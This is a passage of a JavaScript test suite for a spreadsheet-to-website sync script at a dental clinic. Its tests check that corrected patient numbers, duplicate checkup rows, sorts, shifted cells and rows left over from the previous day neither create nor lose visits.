    const rows = [['9858', 'Kamran New', '', 'Consultation', '', status, '', '', '', '', '', '03001116058', '']];
    const { env, server } = world({ rows: { [GUL]: rows }, patients: BASE_PATIENTS });
    settle(env, 3);
    assert.ok(server.patientByMr('9858'), status + ': the slip made a patient file');
    setCell(env, GUL, 2, 'mr', '9853');
    env.advance(61000);
    env.ticks(4);
    assert.equal(server.patientByMr('9858'), undefined, status + ': the file made from the slip is gone (sheet-behaviour RV9-2: before, it stayed with its visit)');
    assert.deepEqual(server.state.visits.map((v) => [v.mr, v.status]), [['9853', status === 'Completed' ? 'completed' : 'in_treatment']], status + ': one visit, on the corrected Mr#');
    assert.equal(rowsNamed(env, GUL, 'Kamran New').length, 1, status + ': no row came back');
    assert.match(logText(env), /The Mr# in this row was corrected and the row was sent again: the visit under the old Mr# is removed from the website\. So is the patient file made from this row \(Mr# 9858\)\./);
  }
});

test('RV9-2: a slip corrected on a visit that has an invoice is not let go: no second visit, the Mr# is written back and the row says to correct the file on the website', () => {
  const rows = [['9868', 'Billed New', '', 'Consultation', '', 'Completed', '', '', '', '', '', '03001116068', '']];
  const { env, server } = world({ rows: { [GUL]: rows }, patients: BASE_PATIENTS });
  settle(env, 3);
  const v = server.state.visits[0];
  server.editVisit(v.id, { attached: true });
  env.ticks(1);
  setCell(env, GUL, 2, 'mr', '9863');
  env.advance(61000);
  env.ticks(3);
  assert.deepEqual(server.state.visits.map((x) => x.id), [v.id], 'the same one visit');
  assert.ok(server.patientByMr('9868'));
  assert.equal(server.patientByMr('9863'), undefined, 'no file for the other number');
  assert.equal(cellOf(env, GUL, 2, 'mr'), '9868', 'written back');
  assert.equal(statusOf(env, GUL, 2), '⚠ Mr# 9868 is put back: this visit has an attached record (invoices) on the website, so the row is not moved to Mr# 9863. If 9863 is the right Mr#, correct the patient file on the website.');
});

test('a checkup patient added on the website and typed again in the sheet (the typed row refused as a duplicate, never deleted): one line on the nightly checkup list', () => {
  const { env, server } = world({ rows: { [GUL]: [['9701', 'Sample Person One', '', 'Scaling', '', 'Waiting', '', '', '', '', '', '03001110001', '']] }, patients: BASE_PATIENTS });
  settle(env, 2);
  server.addCheckup({ branch: 'GUL', date: TODAY, name: 'Nadia Twice', phone: '03008880001', checkup_for: 'Checkup' });
  env.ticks(2);
  assert.equal(rowOf(env, GUL, 'Nadia Twice'), 3, 'added from the website');
  env.typeRow(GUL, 4, ['', 'Nadia Twice', '', 'Checkup', '', 'Waiting', '', '', 'toothache', '', '', '03008880001', '']);
  settle(env, 3);
  assert.match(statusOf(env, GUL, 4), /^✗ Already on this list in row 3/);
  assert.equal(server.state.checkups.length, 1);
  env.at(TODAY, '23:58'); env.ticks(1);
  env.at(NEXT, '00:05'); env.ticks(2);
  assert.deepEqual(ckSheet(env).values().slice(1).map((r) => r[1]), ['Nadia Twice'], 'one line for one person (before: the refused second row was listed too)');
});

// ------------------------------------------------------------------------------------------------ fix loop 1 of round 10 (2026-10-11): SB10-1 (phone-less checkups doubled by a sort), SB10-2 (a left-over row in a sort), the header filter
/** a sort of the visible columns only (the hidden helper columns stay where they are): rows from..to (default every row below the header) by one column; a stable sort, as in Sheets */
function sortVisibleTab(env, tab, label, dir = 1, from = 2, to = null) {
  const sh = env.tab(tab), last = colOf(env, tab, 'website') - 1, c = colOf(env, tab, label);
  const end = to || sh.used().rows, data = [];
  for (let r = from; r <= end; r++) { const row = []; for (let j = 1; j <= last; j++) row.push(sh._get(r, j)); data.push(row); }
  const val = (x) => (x[c - 1] ? String(x[c - 1].v) : '￿');
  data.sort((a, b) => dir * val(a).localeCompare(val(b)));
  data.forEach((row, i) => row.forEach((cell, j) => sh._set(from + i, j + 1, cell)));
  env.touch();
}
const SB_PATIENTS = ['Alpha', 'Bravo', 'Charlie', 'Delta', 'Echo', 'Foxtrot'].map((n, i) => ({ mr: String(9721 + i), name: 'Sb ' + n, phone: '0300555000' + (i + 1) }));
const sbVisit = (i, treatment = 'Scaling') => [SB_PATIENTS[i].mr, SB_PATIENTS[i].name, '', treatment, '', 'Waiting', '', '', 'd' + i, '', '', SB_PATIENTS[i].phone, ''];
const nightLines = (env) => { env.at(TODAY, '23:58'); env.ticks(1); env.at(NEXT, '00:05'); env.ticks(2); return ckSheet(env).values().slice(1).map((r) => r[1]); };
/** every row that shows `name` (copies aside) is linked to a checkup whose details are that row's details: nobody's notes went to the other one */
function ckRowsMatch(env, server, name) {
  for (const r of rowsNamed(env, GUL, name)) {
    if (/^✗ Duplicate of row/.test(statusOf(env, GUL, r))) continue;
    const key = cellOf(env, GUL, r, 'sync key');
    const c = server.state.checkups.find((x) => (x.sheet_key || 'W-' + x.id) === key);
    assert.ok(c, `row ${r} (${name}) is linked to a checkup: ${statusOf(env, GUL, r)}`);
    assert.equal(c.details, cellOf(env, GUL, r, 'treatment details'), `row ${r}: the checkup behind it is the one with this row's details`);
  }
}

test('SB10-1: two walk-ins of one name with no phone (two checkups), Completed, sorted four times with only the visible columns: still two checkups, two rows, two nightly lines', () => {
  const rows = [sbVisit(0), sbVisit(1), ['', 'Sana Walkin', '', 'Checkup', '', 'Completed', '', 'Dr Haniya', 'first sana', '', '', '', ''],
    sbVisit(2), sbVisit(3), ['', 'Sana Walkin', '', 'Checkup', '', 'Completed', '', 'Dr Haniya', 'second sana', '', '', '', ''], sbVisit(4), sbVisit(5)];
  const { env, server } = world({ rows: { [GUL]: rows }, patients: SB_PATIENTS });
  settle(env, 3);
  assert.equal(server.state.checkups.length, 2, 'two walk-ins of one name are two checkups (by design)');
  assert.equal(server.state.visits.length, 6);
  const used = env.tab(GUL).used().rows;
  for (const [label, dir] of [['patient', 1], ['mr', -1], ['patient', 1], ['treatment', -1]]) {
    sortVisibleTab(env, GUL, label, dir);
    env.advance(61000);
    env.ticks(4);
    assert.equal(server.state.checkups.length, 2, `sort by ${label}: no checkup made`);
    assert.equal(server.state.visits.length, 6, `sort by ${label}: no visit made or lost`);
    assert.equal(rowsNamed(env, GUL, 'Sana Walkin').length, 2, `sort by ${label}: two Sana rows (none came back as "Not removed")`);
    assert.equal(env.tab(GUL).used().rows, used, `sort by ${label}: the tab did not grow`);
    assert.equal(server.state.removedLog.length, 0, `sort by ${label}: nothing removed`);
    ckRowsMatch(env, server, 'Sana Walkin');
    for (const r of rowsNamed(env, GUL, 'Sana Walkin')) assert.ok(statusOf(env, GUL, r).startsWith('✓'), `row ${r}: ${statusOf(env, GUL, r)}`);
  }
  quiet(env, server);
  assert.equal(nightLines(env).filter((n) => n === 'Sana Walkin').length, 2, 'two lines for two people');
});

test('SB10-1: the guide\'s path (four rows deleted at once, put back, Ctrl+Z) with a checkup that has no phone, then three sorts: one checkup, the copy still says "Duplicate of row N", one nightly line', () => {
  const rows = [sbVisit(0), sbVisit(1, 'RCT'), ['', 'Ck Nophone', '', 'Checkup', '', 'Treatment', '', 'Dr Haniya', 'pain upper left', '', '', '', ''],
    sbVisit(2, 'Filling'), sbVisit(3, 'Polish'), sbVisit(4), sbVisit(5)];
  const { env, server } = world({ rows: { [GUL]: rows }, patients: SB_PATIENTS });
  settle(env, 3);
  assert.equal(server.state.checkups.length, 1);
  const sh = env.tab(GUL);
  const saved = saveRows(sh, 3, 4);
  env.deleteRows(GUL, 3, 4);
  env.ticks(2);                                               // held: the four rows come back at the bottom
  undoDelete(env, GUL, 3, saved);                             // Ctrl+Z: the originals at their place, the copies say "Duplicate of row N"
  env.advance(61000);
  env.ticks(3);
  assert.equal(rowsNamed(env, GUL, 'Ck Nophone').length, 2);
  const used = sh.used().rows;
  for (const [label, dir] of [['patient', 1], ['mr', -1], ['patient', -1]]) {
    sortVisibleTab(env, GUL, label, dir);
    env.advance(61000);
    env.ticks(4);
    assert.equal(server.state.checkups.length, 1, `sort by ${label}: one checkup patient stays one checkup`);
    assert.equal(server.state.visits.length, 6, `sort by ${label}: one visit per patient`);
    assert.equal(sh.used().rows, used, `sort by ${label}: the tab did not grow`);
    assert.equal(server.state.removedLog.length, 0, `sort by ${label}: nothing removed`);
    for (const name of ['Sb Bravo', 'Ck Nophone', 'Sb Charlie', 'Sb Delta']) {
      const at = rowsNamed(env, GUL, name);
      assert.equal(at.length, 2, `sort by ${label}: ${name} twice`);
      assert.ok(statusOf(env, GUL, at[0]).startsWith('✓'), `sort by ${label}: ${name} row ${at[0]}: ${statusOf(env, GUL, at[0])}`);
      assert.equal(statusOf(env, GUL, at[1]), `✗ Duplicate of row ${at[0]}: delete this row.`, `sort by ${label}: ${name}`);
      assert.equal(cellOf(env, GUL, at[1], 'sync key'), cellOf(env, GUL, at[0], 'sync key'), `sort by ${label}: ${name}: the copy keeps the one key`);
    }
  }
  quiet(env, server);
  assert.deepEqual(nightLines(env).filter((n) => n === 'Ck Nophone'), ['Ck Nophone'], 'one line for one person');
});

test('SB10-1: two same-name checkups with no phone whose rows lost the hidden key (helper cells cleared) each adopt their own checkup: nothing made twice, nothing comes back', () => {
  const rows = [sbVisit(0), ['', 'Sana Walkin', '', 'Checkup', '', 'Completed', '', '', 'first sana', '', '', '', ''], sbVisit(1),
    ['', 'Sana Walkin', '', 'Checkup', '', 'Treatment', '', '', 'second sana', '', '', '', '']];
  const { env, server } = world({ rows: { [GUL]: rows }, patients: SB_PATIENTS });
  settle(env, 3);
  assert.equal(server.state.checkups.length, 2);
  const ids = server.state.checkups.map((c) => c.id);
  const sh = env.tab(GUL);
  for (const r of rowsNamed(env, GUL, 'Sana Walkin')) for (const h of ['sync key', 'sync base', 'sync edited']) sh._set(r, colOf(env, GUL, h), null);
  env.touch();
  env.advance(61000);
  env.ticks(4);
  assert.deepEqual(server.state.checkups.map((c) => c.id), ids, 'the same two checkups, none made');
  assert.equal(rowsNamed(env, GUL, 'Sana Walkin').length, 2, 'no row came back');
  assert.equal(server.state.removedLog.length, 0);
  for (const r of rowsNamed(env, GUL, 'Sana Walkin')) assert.ok(statusOf(env, GUL, r).startsWith('✓'), `row ${r}: ${statusOf(env, GUL, r)}`);
  // a third walk-in of that name typed now is a new person: her own checkup
  env.typeRow(GUL, 6, ['', 'Sana Walkin', '', 'Checkup', '', 'Waiting', '', '', 'third sana', '', '', '', '']);
  settle(env, 3);
  assert.equal(server.state.checkups.length, 3, 'a third Sana gets her own checkup');
});

test('SB10-2: a "Left over from <day>" row in a sort of the visible columns: no visit removed, no visit made for the left-over patient, each row keeps its own message', () => {
  const P = [...SB_PATIENTS, { mr: '9739', name: 'Zed Yesterday', phone: '03005550009' }];
  const { env, server } = world({ rows: { [GUL]: [['9739', 'Zed Yesterday', '7', 'Braces', '', 'Completed', '', '', 'wire', '', '', '03005550009', '']] }, patients: P });
  settle(env, 3);
  const sh = env.tab(GUL);
  const zed = saveRows(sh, 2, 1);
  rv9Night(env);
  assert.deepEqual(dataCells(env), []);
  env.at(NEXT, '08:00');
  // the new day: yesterday's row is back at the top with its hidden cells (a clear that missed it), and today's patients are typed below it
  zed[0].forEach((cell, j) => { if (cell) sh._set(2, j + 1, cell); });
  env.touch();
  env.typeRow(GUL, 3, sbVisit(1, 'RCT'));
  env.typeRow(GUL, 4, sbVisit(2, 'Filling'));
  env.typeRow(GUL, 5, sbVisit(0));
  env.advance(61000);
  env.ticks(3);
  assert.equal(server.visitsOf('GUL', NEXT).length, 3);
  assert.equal(statusOf(env, GUL, 2), `✗ Left over from ${TODAY} (archived that night): delete this row.`);
  const from = server.calls.length;
  sortVisibleTab(env, GUL, 'patient');                        // Sb Alpha, Sb Bravo, Sb Charlie, Zed Yesterday
  assert.equal(cellOf(env, GUL, 5, 'patient'), 'Zed Yesterday');
  env.advance(61000);
  env.ticks(4);
  assert.equal(server.state.removedLog.length, 0, 'no visit removed');
  assert.deepEqual(server.visitsOf('GUL', NEXT).map((v) => server.patientByMr(v.mr).name).sort(), ['Sb Alpha', 'Sb Bravo', 'Sb Charlie'], 'no visit for yesterday\'s patient, today\'s three kept');
  assert.equal(sentRowsSince(server, from).filter((r) => r.set && r.set.name === 'Zed Yesterday').length, 0, 'yesterday\'s row is never sent');
  assert.equal(statusOf(env, GUL, 5), `✗ Left over from ${TODAY} (archived that night): delete this row.`, 'the message went with yesterday\'s patient');
  for (const r of [2, 3, 4]) assert.ok(statusOf(env, GUL, r).startsWith('✓'), `row ${r}: ${statusOf(env, GUL, r)}`);
  quiet(env, server);
  env.deleteRows(GUL, 5);                                     // staff follow the message
  env.ticks(3);
  assert.equal(server.visitsOf('GUL', NEXT).length, 3, 'deleting the left-over row removes nobody');
  assert.equal(server.state.removedLog.length, 0);
});

test('SB10-2: the same sort with today\'s patient also edited in that minute (so the rows did not only swap): the "Left over" memory still goes with yesterday\'s patient; today\'s patient keeps her visit and her edit', () => {
  const P = [...SB_PATIENTS, { mr: '9739', name: 'Zed Yesterday', phone: '03005550009' }];
  const { env, server } = world({ rows: { [GUL]: [['9739', 'Zed Yesterday', '7', 'Braces', '', 'Completed', '', '', 'wire', '', '', '03005550009', '']] }, patients: P });
  settle(env, 3);
  const sh = env.tab(GUL);
  const zed = saveRows(sh, 2, 1);
  rv9Night(env);
  env.at(NEXT, '08:00');
  zed[0].forEach((cell, j) => { if (cell) sh._set(2, j + 1, cell); });
  env.touch();
  env.typeRow(GUL, 3, sbVisit(1, 'RCT'));
  env.typeRow(GUL, 4, sbVisit(0));
  env.advance(61000);
  env.ticks(3);
  const alpha = server.visitsOf('GUL', NEXT).find((v) => v.mr === '9721');
  assert.ok(alpha);
  sortVisibleTab(env, GUL, 'patient');                        // Sb Alpha, Sb Bravo, Zed Yesterday
  assert.equal(cellOf(env, GUL, 4, 'patient'), 'Zed Yesterday');
  setCell(env, GUL, 2, 'waiting', 'Treatment');               // and Sb Alpha goes in to the doctor before the next minute
  env.advance(61000);
  env.ticks(4);
  assert.equal(server.state.removedLog.length, 0, 'no visit removed');
  assert.deepEqual(server.visitsOf('GUL', NEXT).map((v) => v.mr).sort(), ['9721', '9722'], 'the same two visits: none made for yesterday\'s patient');
  assert.ok(server.visitById(alpha.id), 'Sb Alpha\'s own visit, not a new one');
  assert.equal(server.visitById(alpha.id).status, 'in_treatment', 'Sb Alpha\'s edit reached her own visit');
  assert.equal(statusOf(env, GUL, 4), `✗ Left over from ${TODAY} (archived that night): delete this row.`);
  for (const r of [2, 3]) assert.ok(statusOf(env, GUL, r).startsWith('✓'), `row ${r}: ${statusOf(env, GUL, r)}`);
  quiet(env, server);
});
// ------------------------------------------------------------------------------------------------ fix loop 2 of round 11 (2026-10-11): B1 (a copied phone-less checkup in a move that is not a closed exchange), B2 (a key left on a row the move made blank)
/** "Delete cells, shift up" over the visible columns of row `from`: the visible cells below move up one row, the hidden helper columns stay */
function shiftUpVisible(env, tab, from) {
  const sh = env.tab(tab), last = colOf(env, tab, 'website') - 1, end = sh.used().rows;
  for (let r = from; r <= end; r++) for (let c = 1; c <= last; c++) sh._set(r, c, sh._get(r + 1, c));
  env.touch();
}
const b1Rows = () => [sbVisit(0), ['', 'Ck Nophone', '', 'Checkup', '', 'Treatment', '', 'Dr Haniya', 'pain upper left', '', '', '', ''], sbVisit(1, 'RCT'), sbVisit(2, 'Filling')];

test('R11-B1: a phone-less checkup and its "Duplicate of row N" copy, then a move of the visible cells that is not a closed exchange (a row cleared and a sort; "Delete cells, shift up"; a sort with a Status typed in the same minute): one checkup, the copy still says so, one nightly line', () => {
  for (const variant of ['cleared + sort', 'shift up', 'sort + status']) {
    const { env, server } = world({ rows: { [GUL]: b1Rows() }, patients: SB_PATIENTS });
    settle(env, 3);
    const sh = env.tab(GUL);
    saveRows(sh, 3, 1)[0].forEach((cell, j) => { if (cell) sh._set(6, j + 1, cell); });     // the whole row copied below, hidden key too
    env.touch();
    env.advance(61000);
    env.ticks(2);
    assert.equal(statusOf(env, GUL, 6), '✗ Duplicate of row 3: delete this row.', variant + ': setup');
    assert.equal(server.state.checkups.length, 1, variant + ': setup');
    const ck = server.state.checkups[0].id;
    if (variant === 'cleared + sort') {                 // Sb Alpha's cells cleared (a wrong entry), then a sort by name: Ck, Ck, Sb Bravo, Sb Charlie, blank
      env.clearRow(GUL, 2, 1, colOf(env, GUL, 'website') - 1);
      sortVisibleTab(env, GUL, 'patient');
    } else if (variant === 'shift up') {                // Ck, Sb Bravo, Sb Charlie, Ck, blank: each key is one row off, the last one on a blank row
      shiftUpVisible(env, GUL, 2);
    } else {                                            // Ck, Ck, Sb Alpha, Sb Bravo, Sb Charlie, and the first Ck goes Completed in that minute
      sortVisibleTab(env, GUL, 'patient');
      setCell(env, GUL, 2, 'waiting', 'Completed');
    }
    env.advance(61000);
    env.ticks(4);
    assert.deepEqual(server.state.checkups.map((c) => c.id), [ck], variant + ': the one checkup, none made (before: a second checkup, in Treatment, that came back when deleted)');
    const at = rowsNamed(env, GUL, 'Ck Nophone');
    assert.equal(at.length, 2, variant + ': both rows are still there');
    assert.ok(statusOf(env, GUL, at[0]).startsWith('✓'), `${variant}: row ${at[0]}: ${statusOf(env, GUL, at[0])}`);
    assert.equal(statusOf(env, GUL, at[1]), `✗ Duplicate of row ${at[0]}: delete this row.`, variant + ': the copy still says so');
    assert.equal(cellOf(env, GUL, at[1], 'sync key'), cellOf(env, GUL, at[0], 'sync key'), variant + ': one key on both rows');
    assert.equal(cellOf(env, GUL, at[0], 'sync key'), server.checkupById(ck).sheet_key || 'W-' + ck, variant + ': the checkup\'s own key');
    if (variant === 'sort + status') assert.equal(server.checkupById(ck).day_status, 'completed', 'the Status typed after the sort reached the one checkup');
    for (const name of ['Sb Bravo', 'Sb Charlie']) {
      const r = rowOf(env, GUL, name);
      assert.ok(statusOf(env, GUL, r).startsWith('✓'), `${variant}: ${name}: ${statusOf(env, GUL, r)}`);
      assert.equal(cellOf(env, GUL, r, 'sync key'), webVisit(server, name).sheet_key, `${variant}: ${name} carries its own visit's key`);
    }
    assert.equal(server.state.visits.length, variant === 'sort + status' ? 3 : 2, variant + ': only the cleared wrong entry\'s visit is gone');
    assert.deepEqual(nightLines(env).filter((n) => n === 'Ck Nophone'), ['Ck Nophone'], variant + ': one nightly line for one person');
  }
});

test('R11-B1: the copy row deleted with "Delete cells, shift up" or cleared, and the original deleted with "Delete cells, shift up": one row and one checkup are left, nothing comes back', () => {
  for (const variant of ['copy shifted up', 'copy cleared', 'original shifted up']) {
    const { env, server } = world({ rows: { [GUL]: b1Rows() }, patients: SB_PATIENTS });
    settle(env, 3);
    const sh = env.tab(GUL);
    saveRows(sh, 3, 1)[0].forEach((cell, j) => { if (cell) sh._set(6, j + 1, cell); });
    env.touch();
    env.advance(61000);
    env.ticks(2);
    const ck = server.state.checkups[0].id;
    if (variant === 'copy shifted up') shiftUpVisible(env, GUL, 6);
    else if (variant === 'copy cleared') env.clearRow(GUL, 6, 1, colOf(env, GUL, 'website') - 1);
    else shiftUpVisible(env, GUL, 3);
    env.advance(61000);
    env.ticks(4);
    assert.deepEqual(server.state.checkups.map((c) => c.id), [ck], variant + ': the one checkup');
    const at = rowsNamed(env, GUL, 'Ck Nophone');
    assert.equal(at.length, 1, variant + ': one row (nothing came back as "Not removed")');
    assert.ok(statusOf(env, GUL, at[0]).startsWith('✓'), `${variant}: ${statusOf(env, GUL, at[0])}`);
    assert.equal(server.state.visits.length, 3, variant + ': every visit kept');
    assert.equal(server.state.removedLog.length, 0, variant + ': nothing removed');
    quiet(env, server);
  }
});

test('R11-B1: two walk-ins of one name with no phone (two checkups), one of them copied, then "Delete cells, shift up": the copied key is not handed to the other walk-in (her checkup is never deleted, her row is never called a duplicate)', () => {
  const rows = [sbVisit(0), ['', 'Sana Walkin', '', 'Checkup', '', 'Treatment', '', '', 'first sana', '', '', '', ''], sbVisit(1),
    ['', 'Sana Walkin', '', 'Checkup', '', 'Treatment', '', '', 'second sana', '', '', '', '']];
  const { env, server } = world({ rows: { [GUL]: rows }, patients: SB_PATIENTS });
  settle(env, 3);
  const sh = env.tab(GUL);
  saveRows(sh, 3, 1)[0].forEach((cell, j) => { if (cell) sh._set(6, j + 1, cell); });     // the first Sana's whole row copied below
  env.touch();
  env.advance(61000);
  env.ticks(2);
  assert.equal(statusOf(env, GUL, 6), '✗ Duplicate of row 3: delete this row.');
  const ids = server.state.checkups.map((c) => c.id);
  assert.equal(ids.length, 2);
  shiftUpVisible(env, GUL, 2);                                // Sb Alpha (a wrong entry) removed: Sana, Sb Bravo, Sana, Sana, blank
  env.advance(61000);
  env.ticks(4);
  for (const id of ids) assert.ok(server.checkupById(id), 'both walk-ins keep their own checkup');
  assert.equal(server.state.removedLog.filter((x) => /Sana/.test(JSON.stringify(x))).length, 0, 'no Sana checkup removed');
  const second = rowsNamed(env, GUL, 'Sana Walkin').filter((r) => cellOf(env, GUL, r, 'treatment details') === 'second sana');
  assert.equal(second.length, 1);
  assert.ok(!/^✗ Duplicate of row/.test(statusOf(env, GUL, second[0])), 'the second walk-in\'s own row is not called a copy of the first: ' + statusOf(env, GUL, second[0]));
});

/** yesterday's rows put back at the top of the new day's tab with their hidden cells (a clear that missed them, a Version history restore) */
function leftOverWorld(leftRows, todayRows = [], P = []) {
  const { env, server } = world({ rows: { [GUL]: leftRows }, patients: [...SB_PATIENTS, ...P] });
  settle(env, 3);
  const sh = env.tab(GUL);
  const saved = saveRows(sh, 2, leftRows.length);
  rv9Night(env);
  assert.deepEqual(dataCells(env), []);
  env.at(NEXT, '08:00');
  todayRows.forEach((row, i) => env.typeRow(GUL, 2 + i, row));
  saved.forEach((row, i) => row.forEach((cell, j) => { if (cell) sh._set(2 + todayRows.length + i, j + 1, cell); }));
  env.touch();
  env.advance(61000);
  env.ticks(3);
  return { env, server, sh };
}
const LEFT = `✗ Left over from ${TODAY} (archived that night): delete this row.`;
const B2_P = [{ mr: '9738', name: 'Yara Leftover', phone: '03005550008' }, { mr: '9739', name: 'Zed Leftover', phone: '03005550009' }];
const yaraRow = () => ['9738', 'Yara Leftover', '5', 'Braces', '', 'Completed', '', '', 'wire', '', '', '03005550008', ''];
const zedRow = () => ['9739', 'Zed Leftover', '7', 'Braces', '', 'Completed', '', '', 'wire', '', '', '03005550009', ''];

test('R11-B2: early morning, only two "Left over" rows; the first removed with "Delete cells, shift up": the second stays "Left over", no visit of today is made for it', () => {
  const { env, server } = leftOverWorld([yaraRow(), zedRow()], [], B2_P);
  assert.equal(statusOf(env, GUL, 2), LEFT);
  assert.equal(statusOf(env, GUL, 3), LEFT);
  const from = server.calls.length;
  shiftUpVisible(env, GUL, 2);
  assert.equal(cellOf(env, GUL, 2, 'patient'), 'Zed Leftover');
  env.advance(61000);
  env.ticks(3);
  assert.deepEqual(server.visitsOf('GUL', NEXT), [], 'no visit of today for yesterday\'s patient (before: a Completed braces visit, month 7, photo step skipped)');
  assert.equal(sentRowsSince(server, from).filter((r) => r.set && r.set.name === 'Zed Leftover').length, 0, 'yesterday\'s row is never sent');
  assert.equal(statusOf(env, GUL, 2), LEFT, 'the message went with yesterday\'s patient');
  assert.equal(cellOf(env, GUL, 3, 'sync key'), '', 'the blank row lets its key go');
  quiet(env, server);
});

test('R11-B2: a "Left over" row as the last row, then the visible cells move up one row ("Delete cells, shift up" on a wrong entry; a row cleared and a sort; its cells cut and pasted lower): no visit of today for it, it still says "Left over"', () => {
  for (const variant of ['shift up', 'cleared + sort', 'cut + paste']) {
    const { env, server, sh } = leftOverWorld([zedRow()], [sbVisit(1, 'RCT'), sbVisit(2, 'Filling'), sbVisit(0)], B2_P);
    assert.equal(statusOf(env, GUL, 5), LEFT, variant + ': setup');
    assert.equal(server.visitsOf('GUL', NEXT).length, 3, variant + ': setup');
    const from = server.calls.length, W = colOf(env, GUL, 'website') - 1;
    if (variant === 'shift up') shiftUpVisible(env, GUL, 2);                    // Sb Bravo (a wrong entry) removed: Sb Charlie, Sb Alpha, Zed, blank
    else if (variant === 'cleared + sort') { env.clearRow(GUL, 3, 1, W); sortVisibleTab(env, GUL, 'patient'); }     // Sb Alpha, Sb Bravo, Zed, blank
    else {                                                                      // Zed's visible cells cut and pasted two rows lower
      const cells = Array.from({ length: W }, (_, j) => sh._get(5, j + 1));
      for (let c = 1; c <= W; c++) sh._set(5, c, null);
      cells.forEach((cell, j) => sh._set(7, j + 1, cell));
      env.ctx.aajOnEdit({ range: sh.getRange(7, 1, 1, W), source: env.book });
    }
    const zr = rowOf(env, GUL, 'Zed Leftover');
    env.advance(61000);
    env.ticks(4);
    assert.equal(server.visitsOf('GUL', NEXT).filter((v) => v.mr === '9739').length, 0, variant + ': no visit of today for yesterday\'s patient');
    assert.equal(sentRowsSince(server, from).filter((r) => r.set && r.set.name === 'Zed Leftover').length, 0, variant + ': yesterday\'s row is never sent');
    assert.equal(statusOf(env, GUL, zr), LEFT, variant + ': the message went with yesterday\'s patient');
    for (const name of ['Sb Alpha', 'Sb Bravo', 'Sb Charlie']) {
      const r = rowOf(env, GUL, name);
      if (!r) continue;
      assert.ok(statusOf(env, GUL, r).startsWith('✓'), `${variant}: ${name}: ${statusOf(env, GUL, r)}`);
    }
  }
});

test('R11-B2: a "deleted on the website" row as the last row, then "Delete cells, shift up" on a wrong entry above it: the visit front desk deleted is not made again and the row still says so', () => {
  const { env, server } = synced();
  const r7 = rowOf(env, GUL, 'Sample Person Six');
  assert.equal(r7, 7, 'the last row');
  server.removeVisit(webVisit(server, 'Sample Person Six').id);
  env.ticks(1);
  assert.equal(statusOf(env, GUL, 7), GONE);
  const from = server.calls.length;
  shiftUpVisible(env, GUL, 2);                                // Sample Person One (a wrong entry) removed: every person one row up, row 7 blank
  assert.equal(cellOf(env, GUL, 6, 'patient'), 'Sample Person Six');
  env.advance(61000);
  env.ticks(4);
  assert.equal(visitOfMr(server, '9703').length, 0, 'the visit front desk deleted is not made again (owner decision 2)');
  assert.equal(sentRowsSince(server, from).filter((r) => r.set && r.set.name === 'Sample Person Six').length, 0, 'its row is not sent');
  assert.equal(statusOf(env, GUL, 6), GONE, 'the row still says so');
  for (const name of ['Sample Person Two', 'Sample Person Three', 'Sample Person Four', 'Sample Person Five']) {
    const r = rowOf(env, GUL, name);
    assert.ok(/^[✓⚠]/.test(statusOf(env, GUL, r)), name + ': ' + statusOf(env, GUL, r));
    assert.equal(cellOf(env, GUL, r, 'sync key'), webVisit(server, name).sheet_key, name + ' carries its own visit\'s key');
  }
});

test('R11-B2: a "deleted on the website" row whose "Duplicate of row N" copy was just cleared, then "Delete cells, shift up" on a wrong entry: the deleted visit is not made again', () => {
  const { env, server } = synced();
  server.removeVisit(webVisit(server, 'Sample Person Five').id);
  env.ticks(1);
  assert.equal(statusOf(env, GUL, 6), GONE);
  const sh = env.tab(GUL);
  saveRows(sh, 6, 1)[0].forEach((cell, j) => { if (cell) sh._set(9, j + 1, cell); });     // its whole row copied below
  env.touch();
  env.advance(61000);
  env.ticks(2);
  assert.equal(statusOf(env, GUL, 9), '✗ Duplicate of row 6: delete this row.');
  env.clearRow(GUL, 9, 1, colOf(env, GUL, 'website') - 1);     // the copy cleared (its hidden key stays a moment)
  shiftUpVisible(env, GUL, 2);                                // and in the same minute Sample Person One removed with "Delete cells, shift up"
  assert.equal(cellOf(env, GUL, 5, 'patient'), 'Sample Person Five');
  env.advance(61000);
  env.ticks(4);
  assert.equal(visitOfMr(server, '9705').length, 0, 'the visit front desk deleted is not made again');
  assert.equal(statusOf(env, GUL, 5), GONE, 'the row still says so');
});

test('R11-B2: a "deleted on the website" row above a "Left over" row, then a sort that puts the deleted person on the left-over row\'s place, with a Status typed in that minute: each memory goes with its own person', () => {
  const { env, server } = leftOverWorld([zedRow()], [sbVisit(2, 'Filling')], B2_P);    // Sb Charlie (row 2), Zed left over (row 3)
  env.typeRow(GUL, 4, sbVisit(0));                            // Sb Alpha
  env.advance(61000);
  env.ticks(3);
  assert.equal(statusOf(env, GUL, 3), LEFT);
  const alpha = server.visitsOf('GUL', NEXT).find((v) => v.mr === '9721');
  server.removeVisit(server.visitsOf('GUL', NEXT).find((v) => v.mr === '9723').id);
  env.ticks(1);
  assert.equal(statusOf(env, GUL, 2), GONE);
  const from = server.calls.length;
  sortVisibleTab(env, GUL, 'patient');                        // Sb Alpha, Sb Charlie (on Zed's key), Zed (on Sb Alpha's key)
  setCell(env, GUL, 2, 'waiting', 'Treatment');               // and Sb Alpha goes in, so the rows did not only swap
  env.advance(61000);
  env.ticks(4);
  assert.equal(server.visitsOf('GUL', NEXT).filter((v) => v.mr === '9739').length, 0, 'no visit of today for yesterday\'s patient');
  assert.equal(sentRowsSince(server, from).filter((r) => r.set && r.set.name === 'Zed Leftover').length, 0, 'yesterday\'s row is never sent');
  assert.equal(statusOf(env, GUL, 4), LEFT, 'the "Left over" message went with Zed');
  assert.equal(visitOfMr(server, '9723').length, 0, 'the visit front desk deleted is not made again');
  assert.equal(statusOf(env, GUL, 3), GONE, 'the "deleted" message went with Sb Charlie');
  assert.equal(server.visitById(alpha.id).status, 'in_treatment', 'Sb Alpha\'s edit reached her own visit');
});

test('R11-B2: the archive clears a row as "left over" only while it shows that earlier day\'s person (the rule of aajScanTab): a patient a sort put on an old key is copied', () => {
  const { env } = world({ rows: { [GUL]: [zedRow(), sbVisit(0)] }, patients: [...SB_PATIENTS, ...B2_P] });
  const sh = env.tab(GUL), y = '2026-10-08';
  const put = (r, key, s, n) => {
    sh._set(r, colOf(env, GUL, 'sync key'), { kind: 's', v: key });
    sh._set(r, colOf(env, GUL, 'sync base'), { kind: 's', v: JSON.stringify({ v: '00000000-0000-0000-0000-00000000000' + n, d: y, b: 'GUL', s, w: { mr: s.mr, name: s.name } }) });
    sh._set(r, colOf(env, GUL, 'sync edited'), { kind: 's', v: String(Date.parse(y + 'T15:00:00+05:00')) });
  };
  put(2, 'S-0123456789ab', { mr: '9739', name: 'Zed Leftover', phone: '03005550009' }, 1);     // still that day's person
